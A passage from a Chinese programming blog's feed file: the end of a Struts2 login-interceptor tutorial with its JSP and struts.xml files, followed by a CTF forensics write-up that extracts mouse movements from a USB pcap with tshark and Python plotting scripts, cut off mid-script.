class="hljs-string">&quot;登录&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>main.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>main.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_del&quot;</span>&gt;</span>book del<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_add&quot;</span>&gt;</span>book add<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_update&quot;</span>&gt;</span>book update<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_find&quot;</span>&gt;</span>book find<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>成功页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>用户$&#123;user.username&#125;操作成功<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 声明拦截器 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;privilege&quot;</span> </span><br><span class="hljs-tag">             <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.interceptor.PrivilegeInterceptor&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;privilege&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-ref</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 用户登录操作 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/main.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;input&quot;</span>&gt;</span>/login.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 关于book操作 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;book_*&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">method</span>=<span class="hljs-string">&quot;&#123;1&#125;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span>&gt;</span>/login.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发布项目，访问main.jsp<br><img src="https://img-blog.csdnimg.cn/20210416221426697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击连接，由于没有登陆，所以没有权限，页面跳转到登录页面要求用户登录。<br><img src="https://img-blog.csdnimg.cn/20210416221438400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登陆成功后点击链接，跳转成功页面，提示用户操作成功。<br><img src="https://img-blog.csdnimg.cn/20210416222502828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>对比可知拦截器成功执行</p><p>以上案例中，创建了一个方法过滤器PrivilegeInterceptor，在struts.xml中配置了该拦截器，如果用户没有登陆，将无法对页面链接进行相应操作，只有登陆后的用户才有权限操作页面相应功能。</p><h2 id="拦截器工作原理"><a href="#拦截器工作原理" class="headerlink" title="拦截器工作原理"></a>拦截器工作原理</h2><p><strong>拦截器的执行顺序</strong><br>invocation.invoke()方法是拦截器框架的实现核心，通过确定invocation.invoke()方法执行位置，来实现Action执行前后处理操作，在invocation.invoke()方法之前的代码将依据配置中拦截器顺序依次执行，直到走完拦截器后再执行invocation.invoke()方法调用Action，然后再依据配置中拦截器顺序反向执行invocation.invoke()方法后的代码，直到走完拦截器</p><p><strong>拦截器的工作原理</strong><br>如图所示<br><img src="https://img-blog.csdnimg.cn/2021042220560043.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>每一个Action请求都包装在一系列的拦截器的内部。拦截器可以在Action执行直线做相似的操作也可以在Action执行直后做回收操作。</p><p>每一个Action既可以将操作转交给下面的拦截器，Action也可以直接退出操作返回客户既定的画面。</p><p><a href="https://www.cnblogs.com/yw-ah/p/5761235.html">https://www.cnblogs.com/yw-ah/p/5761235.html</a><br><a href="https://www.cnblogs.com/wkrbky/p/5894315.html">https://www.cnblogs.com/wkrbky/p/5894315.html</a><br><a href="https://blog.csdn.net/weixin_42529699/article/details/81354355">https://blog.csdn.net/weixin_42529699/article/details/81354355</a><br><a href="https://www.imooc.com/learn/450">https://www.imooc.com/learn/450</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：Struts2框架学习笔记（三）&lt;/p&gt;</summary>
    
    
    
    <category term="编程开发" scheme="https://swhat.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    <category term="JAVA" scheme="https://swhat.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/JAVA/"/>
    
    
    <category term="Struts2" scheme="https://swhat.github.io/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>USB流量分析</title>
    <link href="https://swhat.github.io/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>https://swhat.github.io/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2021-04-12T04:58:33.024Z</published>
    <updated>2021-08-15T03:59:06.586Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：USB流量分析</p> <a id="more"></a><h2 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节</p><p>第一个字节,代表按键</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">当取0×00时,代表没有按键<br>当取0×01时,代表按左键<br>当取0×02时,代表当前按键为右键<br></code></pre></td></tr></table></figure><p>第二个字节,可看作为signed byte类型，其最高位为符号位，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">当值为正时，代表鼠标右移像素位；<br>值为负时，代表鼠标左移像素位。<br></code></pre></td></tr></table></figure><p>第三个字节,代表垂直上下移动的偏移。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">当值为正时，代表鼠标上移像素位；<br>值为负时，代表鼠标下移像素位。<br></code></pre></td></tr></table></figure><h3 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h3><p>flag隐藏在usb流量中，通过USB协议数据中的鼠标移动轨迹转换成flag</p><p><strong>题目</strong><br>方法1：<br>基于python2的UsbMiceHacker.py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding:utf-8</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>mousePositionX = <span class="hljs-number">0</span><br>mousePositionY = <span class="hljs-number">0</span><br><br>X = []<br>Y = []<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br>data = []<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">global</span> mousePositionX<br>    <span class="hljs-keyword">global</span> mousePositionY<br>    <span class="hljs-comment"># check argv</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        python UsbMiceHacker.py data.pcap [LEFT|RIGHT|MOVE|ALL]&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Tips : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        To use this python script , you must install the numpy,matplotlib first.&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        You can use `sudo pip install matplotlib numpy` to install it&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Author : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        If you have any questions , please contact me by email.&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        Thank you for using.&quot;</span><br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># get argv</span><br>    pcapFilePath = sys.argv[<span class="hljs-number">1</span>]<br>    action = sys.argv[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-keyword">if</span> action != <span class="hljs-string">&quot;LEFT&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;ALL&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;RIGHT&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;MOVE&quot;</span>:<br>        action = <span class="hljs-string">&quot;LEFT&quot;</span><br><br>    <span class="hljs-comment"># get data of pcap</span><br>    command = <span class="hljs-string">&quot;tshark -r &#x27;%s&#x27; -T fields -e usb.capdata &gt; %s&quot;</span> % (<br>        pcapFilePath, DataFileName)<br>    <span class="hljs-built_in">print</span> command<br>    os.system(command)<br><br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DataFileName, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            data.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br><br>    <span class="hljs-comment"># handle move</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        Bytes = i.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(Bytes) == <span class="hljs-number">8</span>:<br>            horizontal = <span class="hljs-number">2</span>  <span class="hljs-comment"># -</span><br>            vertical = <span class="hljs-number">4</span>  <span class="hljs-comment"># |</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(Bytes) == <span class="hljs-number">4</span>:<br>            horizontal = <span class="hljs-number">1</span>  <span class="hljs-comment"># -</span><br>            vertical = <span class="hljs-number">2</span>  <span class="hljs-comment"># |</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        offsetX = <span class="hljs-built_in">int</span>(Bytes[horizontal], <span class="hljs-number">16</span>)<br>        offsetY = <span class="hljs-built_in">int</span>(Bytes[vertical], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> offsetX &gt; <span class="hljs-number">127</span>:<br>            offsetX -= <span class="hljs-number">256</span><br>        <span class="hljs-keyword">if</span> offsetY &gt; <span class="hljs-number">127</span>:<br>            offsetY -= <span class="hljs-number">256</span><br>        mousePositionX += offsetX<br>        mousePositionY += offsetY<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;01&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Left butten.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;LEFT&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">elif</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;02&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Right Butten.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;RIGHT&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">elif</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Move.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;MOVE&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># print &quot;[-] Known operate.&quot;</span><br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;ALL&quot;</span>:<br>            <span class="hljs-comment"># draw point to the image panel</span><br>            X.append(mousePositionX)<br>            Y.append(-mousePositionY)<br><br>    fig = plt.figure()<br>    ax1 = fig.add_subplot(<span class="hljs-number">111</span>)<br><br>    ax1.set_title(<span class="hljs-string">&#x27;[%s]-[%s] Author : WangYihang&#x27;</span> % (pcapFilePath, action))<br>    ax1.scatter(X, Y, c=<span class="hljs-string">&#x27;r&#x27;</span>, marker=<span class="hljs-string">&#x27;o&#x27;</span>)<br>    plt.show()<br><br>    <span class="hljs-comment"># clean temp data</span><br>    os.system(<span class="hljs-string">&quot;rm ./%s&quot;</span> % (DataFileName))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>还有基于python3的<a href="https://github.com/WangYihang/UsbMiceDataHacker">UsbMiceDataHacker.py</a>脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 UsbMiceDataHacker.py usb2.pcap RIGHT<br><span class="hljs-comment">#RIGHT代表右键</span><br></code></pre></td></tr></table></figure><p>我这里什么也没有<br><img src="https://img-blog.csdnimg.cn/20210412170000487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>贴上其他人成功的结果<br><img src="https://img-blog.csdnimg.cn/20210405124259780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方法2：<br>提取鼠标流量数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r usb2.pcap -T fields -e usb.capdata &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt<br><img src="https://img-blog.csdnimg.cn/20210405124552237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>剔除空行，亲身经历，这步很重要，包含空行会得到错误结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r usb2.pcap -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>没有冒号，使用脚本添加冒号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">f=open(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-keyword">fi</span>=open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> 1:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> len(a)==8: <span class="hljs-comment"># 键盘流量len=16，鼠标流量len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,len(a),2):<br>                <span class="hljs-keyword">if</span> i+2 != len(a):<br>                    out+=a[i]+a[i+1]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+1]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p>运行脚本，得到out.txt<br><img src="https://img-blog.csdnimg.cn/20210405125011771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用mouse.py脚本，通过更改btn_flag的值来测试鼠标左右键</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;xy.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>posx = <span class="hljs-number">0</span><br>posy = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) != <span class="hljs-number">12</span> :<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">3</span>:<span class="hljs-number">5</span>],<span class="hljs-number">16</span>)<br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">127</span> :<br>        x -= <span class="hljs-number">256</span><br>    <span class="hljs-keyword">if</span> y &gt; 